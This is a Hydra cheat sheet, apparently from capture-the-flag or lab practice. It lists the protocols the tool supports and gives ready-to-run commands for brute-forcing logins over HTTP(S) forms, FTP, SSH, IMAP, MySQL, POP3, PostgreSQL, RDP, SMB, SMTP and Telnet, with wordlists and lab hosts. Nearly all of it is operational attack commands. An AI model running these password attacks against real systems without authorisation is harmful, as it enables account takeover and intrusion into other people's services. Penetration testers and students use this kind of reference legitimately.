hydra

Available Hydra Protocols

~~~
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP
~~~

Hydra Examples
 
HTTP-POST-FORM

~~~bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
~~~

HTTPS-POST-FORM

~~~bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
~~~

HTTP-GET

~~~bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
~~~

HTTPS-GET

~~~bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local https-get /certsrv/
~~~

FTP

~~~bash
hydra -l user -P passlist.txt ftp://10.10.134.169
~~~

SSH

~~~bash
hydra -l <username> -P <full path to pass> 10.10.134.169 -t 4 ssh
~~~

IMAP

~~~bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V

hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
~~~

MYSQL

~~~bash
hydra -L usernames.txt -P pass.txt <IP> mysql
~~~

POP

~~~bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V

hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
~~~

POSTGRESQL

~~~bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
~~~

RDP

~~~bash
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
~~~

SMB

~~~bash
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
~~~

SMTP

~~~bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V

hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V
~~~

Telnet

~~~bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
~~~

